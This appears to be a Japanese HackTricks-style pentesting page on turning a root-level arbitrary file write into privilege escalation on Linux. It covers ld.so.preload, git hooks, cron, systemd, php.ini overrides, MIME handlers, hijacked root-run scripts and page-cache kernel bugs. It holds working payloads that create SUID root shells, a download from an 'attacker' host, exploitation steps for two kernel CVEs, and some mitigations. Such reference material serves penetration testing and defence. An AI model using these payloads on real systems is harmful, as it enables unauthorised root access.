# Rootへの任意ファイル書き込み

### /etc/ld.so.preload

`/etc/ld.so.preload` は、dynamic linker が他の shared objects より先にロードする shared objects のシステム全体のリストです。Secure-execution mode では preloading に追加の制限が適用されるため、`/tmp/pe.so` のような library path は universal な SUID-binary technique ではありません。\
これを作成または変更できる場合、このファイルをロードするプロセスは、他の shared objects より先にリストされた library をロードするため、そのプロセスの context で code execution が可能になります。<sup>[[12]](#references)</sup>

For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** は、commit や merge 操作を含む、repository 内のイベントで実行される executable script です。**privileged script または user** がこれらの操作を実行し、攻撃者が **`.git` folder に write** できる場合、hook を **privilege escalation** に使用できます。<sup>[[13]](#references)</sup>

例えば、git repo の **`.git/hooks`** に **script を生成**して、新しい commit が作成されるたびに常に実行されるようにできます：
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Cron & Time ファイル

**root が実行する cron 関連ファイルに書き込める**場合、通常は次回の job 実行時に code execution を取得できます。興味深い対象には次のものがあります。<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`、`/etc/cron.daily/*`、`/etc/cron.weekly/*`、`/etc/cron.monthly/*`
- `/var/spool/cron/` または `/var/spool/cron/crontabs/` にある root 自身の crontab
- `systemd` timers と、それらが起動する services

簡単なチェック:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
典型的な悪用経路:

- `/etc/crontab` または `/etc/cron.d/` 内のファイルに **新しい root cron job を追加**
- `run-parts` によって既に実行されている **script を置き換える**
- 起動する script または binary を変更して、**既存の timer target に backdoor を仕込む**

最小限の cron payload の例:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
`run-parts` が使用する cron ディレクトリ内にしか書き込めない場合は、代わりにそこへ実行可能ファイルを配置します：
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
注:

- `run-parts` は通常、ドットを含むファイル名を無視するため、`backup.sh` ではなく `backup` のような名前を使用します。<sup>[[15]](#references)</sup>
- 一部のシステムでは、従来の cron の代わりに `systemd` timers を使用しますが、abuse の考え方は同じです: **root が後で実行するものを変更する**。<sup>[[20]](#references)</sup>

### Service & Socket files

**`systemd` unit files** またはそれらから参照されるファイルに書き込み可能な場合、unit を reload および restart することで、あるいは service/socket activation の path が trigger されるのを待つことで、root として code execution を取得できる可能性があります。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

興味深い target には次のものがあります:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` 内の Drop-in overrides
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` から参照される Service scripts/binaries
- root service によって読み込まれる、書き込み可能な `EnvironmentFile=` paths

簡単なチェック:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
一般的な悪用経路:

- **`ExecStart=` を上書き**して、変更可能な root 所有の service unit に設定する
- **drop-in override を追加**し、悪意のある `ExecStart=` を設定する。その前に古い設定をクリアする
- unit ですでに参照されているスクリプトやバイナリに**バックドアを仕込む**
- socket-activated service を**乗っ取る**。socket が接続を受信したときに起動する、対応する `.service` ファイルを変更する

悪意のある override の例:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
典型的な有効化フロー:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
サービスを自分で再起動できなくても、socket-activated unitを編集できる場合は、**クライアント接続を待つだけ**で、backdoor化したサービスをrootとして実行させられる可能性があります。<sup>[[17]](#references)</sup>

### 特権PHP sandboxで使用される制限の厳しい`php.ini`を上書きする

一部のカスタムdaemonは、ユーザーが指定したPHPを、**制限された`php.ini`**（例：`disable_functions=exec,system,...`）を指定して`php`を実行することで検証します。sandbox内のコードに**何らかのwrite primitive**（`file_put_contents`など）があり、daemonが使用する**正確な`php.ini`のパス**にアクセスできる場合、そのconfigを**上書き**して制限を解除し、その後、elevated privilegesで実行される2つ目のpayloadを送信できます。<sup>[[2]](#references)</sup>

一般的な流れ：

1. 最初のpayloadでsandbox configを上書きする。
2. 危険なfunctionが再び有効になった状態で、2つ目のpayloadがcodeを実行する。

最小限の例（daemonが使用するパスに置き換えてください）：
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
daemonがrootとして実行される場合（またはroot所有のパスで検証する場合）、2回目の実行でroot contextが得られます。これは、sandboxed runtimeが依然としてファイルを書き込める場合における、基本的に**config overwriteによるprivilege escalation**です。

### binfmt_misc

`binfmt_misc`は`/proc/sys/fs/binfmt_misc`配下でregistrationを公開します。各registrationは、file-type patternをinterpreterに関連付けます。privilegeへの影響は、誰がregistrationを変更できるか、また後からmatching fileを実行するプロセスが誰であるかによって異なるため、これらの要件を確認してからprivilege-escalation pathとして扱ってください。<sup>[[21]](#references)</sup>

### schema handlersの上書き（http: または https: など）

デスクトップ環境は、URI schemeに使用するアプリケーションを選択するためにMIME associationとdesktop entryを使用します。攻撃者が関連するper-user configurationおよびdesktop-entry directoryに書き込める場合、それらのschemeを攻撃者が制御するlauncherにredirectできます。`$HOME/.config/mimeapps.list`ファイルを変更して、HTTPおよびHTTPS URL handlerをmalicious file（例：`x-scheme-handler/http=evil.desktop`および`x-scheme-handler/https=evil.desktop`）に設定すると、ユーザーのクリックによってそのdesktop entryをinvokeできます。<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root が実行する user-writable な scripts/binaries

privileged workflow が `/bin/sh /home/username/.../script` のようなもの（または unprivileged user が所有する directory 内の binary）を実行する場合、それを hijack できます:<sup>[[1]](#references)</sup>

- **実行を検出する:** pspy で processes を monitor し、root が user-controlled paths を invoke していることを捕捉します。<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **書き込み可能性を確認:** 対象ファイルとそのディレクトリの両方が、ユーザーによって所有されているか、ユーザーが書き込み可能であることを確認します。
- **対象をHijack:** 元のバイナリ/スクリプトをバックアップし、SUID shell（またはその他のroot操作）を作成するpayloadを配置してから、権限を復元します:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **privileged action を trigger する**（例: helper を spawn する UI button を押す）。root が hijacked path を再実行したら、`./rootshell -p` で escalated shell を取得する。

### privileged binary の page-cache-only file modification

一部の kernel bug は、file **on disk** を変更しません。代わりに、読み取り可能な file の **page cache copy** のみを変更できます。**setuid** またはその他の方法で **root-executed** される binary を対象にできれば、次回の実行時に attacker-controlled bytes が memory から実行され、disk 上の file hash が変更されていなくても privileges を escalate できます。<sup>[[3]](#references)[[4]](#references)</sup>

これは **runtime-only file write primitive** として考えると有用です:<sup>[[3]](#references)</sup>

- **Disk stays clean**: inode と disk 上の bytes は変更されない
- **Memory is dirty**: cached page を読み取りまたは実行する process は、attacker が変更した content を取得する
- **Effect is temporary**: reboot または cache eviction 後に変更は消える

この primitive は、classic **arbitrary file write** と、Dirty COW / Dirty Pipe などの古い **page-cache abuse** bug の中間に位置します:<sup>[[3]](#references)</sup>

- Dirty COW は race に依存していた
- Dirty Pipe には write-position の制約があった
- vulnerable path が cached file-backed page への直接 write を提供する場合、page-cache-only primitive の方が reliable になり得る

#### Generic privesc flow

1. **file-backed page cache pages** に write できる kernel primitive を取得する
2. **readable privileged binary** または root-executed file に対して使用する
3. page が cache から evict される **前に** execution を trigger する
4. on-disk file が未変更に見える状態で、root として code execution を取得する

Typical high-value targets:

- **setuid-root** binaries
- **root services** が launch する helpers
- **host kernel/page cache を共有する containers** から一般的に実行される binaries

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) は、この class の良い example です。vulnerable path は Linux crypto userspace API（`AF_ALG` / `algif_aead`）にありました:<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` は、readable file の page-cache pages への references を crypto TX scatterlist に移動できる
- in-place の `algif_aead` decrypt path は source と destination buffers を再利用した
- `authencesn` はその後、destination tag region に write した
- その region がまだ spliced file-backed pages を参照している場合、write は **target file の page cache** に書き込まれた

したがって興味深い technique は CVE そのものではなく、次の pattern です:

- **file-backed cache pages を kernel subsystem に feed する**
- subsystem にそれらを **writable output として扱わせる**
- memory 上で小さく制御された overwrite を trigger する

公開された PoC は、反復する **4-byte writes** を使用して `/usr/bin/su` を memory 上で patch し、その後実行しました。<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) は、同じ **page-cache-only write-to-root** pattern の別 variant を示しています。ただし今回は sink が `AF_ALG` ではなく **IPsec ESP decrypt** です。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

重要な technique は **metadata-laundering step** です:

- `splice()` は **read-only file-backed page-cache page** を ESP-in-UDP packet に配置する
- 元の DirtyFrag mitigation は、その skb に `SKBFL_SHARED_FRAG` を tag し、`esp_input()` が **decrypt 前に copy** するようにしていた
- netfilter `TEE` は `nf_dup_ipv4()` -> `__pskb_copy_fclone()` を通じて packet を duplicate する
- clone は **同じ physical page-cache reference** を保持するが、`SKBFL_SHARED_FRAG` を失う
- その後 `esp_input()` は clone を safe とみなし、file-backed page 上で **in-place `cbc(aes)` decrypt** を実行する

したがって reviewer にとっての lesson は CVE よりも広範です: operation の前に copy が必要かどうかを判断するために **skb/page metadata** に依存する mitigation では、backing page を保持したまま metadata を削除する **clone/copy path** によって、write primitive が気付かないうちに再び有効化される可能性があります。

Typical exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` により、**private network namespace 内で `CAP_NET_ADMIN`** を取得する
2. loopback を up にし、`mangle/OUTPUT` に **netfilter `TEE` rule** を install する
3. `NETLINK_XFRM` 経由で **XFRM ESP transport SAs** を install する
4. SA の `seq_hi` field に target の各 4-byte word を encode する（DirtyFrag の word-selection trick）
5. spliced ESP-in-UDP packet を送信し、**TEE clone** が `esp_input()` に到達して **in place** で decrypt されるようにする
6. page-cache copy of `/usr/bin/su` または別の privileged executable に attacker-controlled code が含まれるまで repeat する

Operationally、impact は `AF_ALG` example と同じです: disk 上の file は clean なままですが、`execve()` は **mutated page-cache bytes** を使用し、root を取得できます。<sup>[[8]](#references)[[9]](#references)</sup>

この variant の useful exposure checks:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
ここでの短期的な攻撃対象領域の削減もパス固有です。`48f6a5356a33` を含む kernel にアップグレードすると clone path が修正され、`xt_TEE` の autoload をブロックすると **flag-laundering step** が除去され、`esp4` / `esp6` をブロックすると **decrypt sink** が除去されます。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure と hunting

このクラスの bug を疑う場合、disk integrity checks だけに頼らないでください。次の項目も確認します。
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
以下の設定値は、loadable interfaceとkernelに組み込まれたinterfaceを区別します。crypto build rulesでは、`CONFIG_CRYPTO_USER_API_AEAD`を`algif_aead`に対応付けています。<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead`はmoduleとしてloadまたはunloadできる
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfaceはkernelに組み込まれる
- setuid binariesは、page-cache-only patchだけでlocal footholdをrootに昇格できる可能性があるため、適切なtargetです

#### `algif_aead` pathのattack-surface reduction

vulnerable interfaceがloadable moduleによって提供されている場合:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
カーネルにコンパイルされている場合、いくつかの情報開示では、次の方法で init パスをブロックしたと報告されています：<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
この種の緩和策は、他の kernel LPE についても覚えておく価値があります。exploit が特定の optional interface に依存している場合、その interface を無効化または blacklist に登録することで、kernel の完全な upgrade が利用可能になる前でも exploit path を断つことができます。<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – ユーザーが書き込み可能な PaperCut ディレクトリ内の root 実行スクリプトを hijack](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431 に関する Openwall oss-security の disclosure](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - out-of-place で動作するよう revert](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint の technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE variant DirtyClone (CVE-2026-43503) の dissecting and exploiting](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: `__pskb_copy_fclone()` で `SKBFL_SHARED_FRAG` を preserve (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux earlier mitigation: spliced UDP packets に `SKBFL_SHARED_FRAG` を set (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
{{#include ../../banners/hacktricks-training.md}}
